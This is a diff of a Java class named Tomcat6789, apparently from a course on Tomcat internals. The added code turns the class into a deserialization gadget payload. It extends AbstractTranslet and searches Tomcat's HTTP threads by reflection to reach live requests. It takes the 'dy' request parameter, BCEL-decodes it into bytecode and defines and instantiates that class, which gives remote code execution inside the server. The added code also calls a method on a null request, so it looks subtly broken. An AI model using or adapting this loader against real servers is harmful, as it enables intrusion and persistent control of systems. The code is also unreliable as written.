@@ -1,157 +1,101 @@
 package lagou.edu.stdContext;
 
-import org.apache.catalina.core.StandardContext;
-import org.apache.catalina.core.StandardEngine;
-import org.apache.catalina.core.StandardHost;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.catalina.connector.CoyoteReader;
+import org.apache.catalina.session.StandardSession;
+import org.apache.coyote.Response;
 
+import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.HttpSession;
 import java.lang.reflect.Field;
+import java.lang.reflect.Method;
 import java.util.*;
 
-class Tomcat6789 {
-    String uri;
-    String serverName;
-    private ArrayList<StandardContext> standardContext_=new ArrayList<>();
-    private ArrayList<StandardContext> standardContext__=new ArrayList<>();
-    public Object getField(Object object, String fieldName) {
-        Field declaredField;
-        Class clazz = object.getClass();
-        while (clazz != Object.class) {
-            try {
-
-                declaredField = clazz.getDeclaredField(fieldName);
-                declaredField.setAccessible(true);
-                return declaredField.get(object);
-            } catch (NoSuchFieldException e){}
-            catch (IllegalAccessException e){}
-            clazz = clazz.getSuperclass();
-        }
-        return null;
-    }
+public class Tomcat6789 extends AbstractTranslet {
 
     public Tomcat6789() {
-        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
-        Object object;
-        for (Thread thread : threads) {
+        try {
+            org.apache.catalina.connector.Request request = null;
+            HttpSession session = request.getSession();
+            String dy = null;
+            boolean done = false;
+            Thread[] ts = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads"));
 
-            if (thread == null) {
-                continue;
-            }
-            if (thread.getName().contains("exec")) {
-                continue;
-            }
-            Object target = this.getField(thread, "target");
-            if (!(target instanceof Runnable)) {
-                continue;
-            }
+            for (int i = 0; i < ts.length; ++i) {
+                Thread t = ts[i];
+                if (t != null) {
+                    String s = t.getName();
+                    if (!s.contains("exec") && s.contains("http")) {
+                        Object o = getFV(t, "target");
+                        if (o instanceof Runnable) {
+                            try {
+                                o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
+                            } catch (Exception var16) {
+                                continue;
+                            }
 
-            try {
-                object = getField(getField(getField(target, "this$0"), "handler"), "global");
-            } catch (Exception e) {
-                continue;
-            }
-            if (object == null) {
-                continue;
-            }
-            java.util.ArrayList processors = (java.util.ArrayList) getField(object, "processors");
-            Iterator iterator = processors.iterator();
-            while (iterator.hasNext()) {
-                Object next = iterator.next();
+                            List ps = (List) getFV(o, "processors");
 
-                Object req = getField(next, "req");
-                Object serverPort = getField(req, "serverPort");
-                if (serverPort.equals(-1)){continue;}
-                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "serverNameMB");
-                this.serverName = (String) getField(serverNameMB, "strValue");
-                if (this.serverName == null){
-                    this.serverName = serverNameMB.toString();
-                }
-                if (this.serverName == null){
-                    this.serverName = serverNameMB.getString();
-                }
+                            for (int j = 0; j < ps.size(); ++j) {
+                                Object p = ps.get(j);
+                                o = getFV(p, "req");
+                                Object resp = o.getClass().getMethod("getResponse").invoke(o);
+                                Object conreq = o.getClass().getMethod("getNote", Integer.TYPE).invoke(o, new Integer(1));
+                                dy = (String) conreq.getClass().getMethod("getParameter", String.class).invoke(conreq, new String("dy"));
+                                if (dy != null && !dy.isEmpty()) {
+                                    byte[] bytecodes = Utility.decode(dy,false);
+                                    Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
+                                    defineClassMethod.setAccessible(true);
+                                    Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), bytecodes, new Integer(0), new Integer(bytecodes.length));
+                                    cc.newInstance();
+                                    done = true;
+                                }
 
-                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "uriMB");
-                this.uri = (String) getField(uriMB, "strValue");
-                if (this.uri == null){
-                    this.uri = uriMB.toString();
-                }
-                if (this.uri == null){
-                    this.uri = uriMB.getString();
-                }
-
-                this.getStandardContext();
-                return;
-            }
-        }
-    }
-
-    public void getStandardContext() {
-        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
-        for (Thread thread : threads) {
-            if (thread == null) {
-                continue;
-            }
-            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
-                Object target = this.getField(thread, "target");
-                HashMap children;
-                Object jioEndPoint = null;
-                try {
-                    jioEndPoint = getField(target, "this$0");
-                }catch (Exception e){}
-                if (jioEndPoint == null){
-                    try{
-                        jioEndPoint = getField(target, "endpoint");
-                    }catch (Exception e){ return; }
-                }
-                Object service = getField(getField(getField(getField(getField(jioEndPoint, "handler"), "proto"), "adapter"), "connector"), "service");
-                StandardEngine engine = null;
-                try {
-                    engine = (StandardEngine) getField(service, "container");
-                }catch (Exception e){}
-                if (engine == null){
-                    engine = (StandardEngine) getField(service, "engine");
-                }
-
-                children = (HashMap) getField(engine, "children");
-                StandardHost standardHost=null;
-                Iterator<Map.Entry<String ,StandardHost>> entryIterator=children.entrySet().iterator();
-                while (entryIterator.hasNext()){
-                    Map.Entry<String ,StandardHost> entry = entryIterator.next();
-                    standardHost=entry.getValue();
-                    children = (HashMap) getField(standardHost, "children");
-                    Iterator iterator = children.keySet().iterator();
-                    while (iterator.hasNext()){
-                        String contextKey = (String) iterator.next();
-                        if (!(this.uri.startsWith(contextKey))){continue;}
-                        StandardContext standardContext = (StandardContext) children.get(contextKey);
-                        System.out.println(standardContext);
-                        try {
-                            this.standardContext_.add(standardContext);
-                        }catch (Exception e){
-                            e.printStackTrace();
+                                if (done) {
+                                    break;
+                                }
+                            }
                         }
-
                     }
                 }
-
-
-                /*children = (HashMap) getField(standardHost, "children");
-                Iterator iterator = children.keySet().iterator();
-                while (iterator.hasNext()){
-                    String contextKey = (String) iterator.next();
-                    if (!(this.uri.startsWith(contextKey))){continue;}
-                    StandardContext standardContext = (StandardContext) children.get(contextKey);
-                    this.standardContext = standardContext;
-                    return;
-                }*/
             }
+        } catch (Exception var17) {
         }
     }
 
-    public ArrayList<StandardContext> getSTC(){
-        for(int i=0;i<this.standardContext_.size();i++){
-            if(!this.standardContext__.contains(this.standardContext_.get(i)))
-                this.standardContext__.add(this.standardContext_.get(i));
+    private Object getFV(Object o, String s) throws Exception {
+        Field f = null;
+        Class clazz = o.getClass();
+
+        while (clazz != Object.class) {
+            try {
+                f = clazz.getDeclaredField(s);
+                break;
+            } catch (NoSuchFieldException var5) {
+                clazz = clazz.getSuperclass();
+            }
         }
-        return this.standardContext__;
+
+        if (f == null) {
+            throw new NoSuchFieldException(s);
+        } else {
+            f.setAccessible(true);
+            return f.get(o);
+        }
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
     }
 }
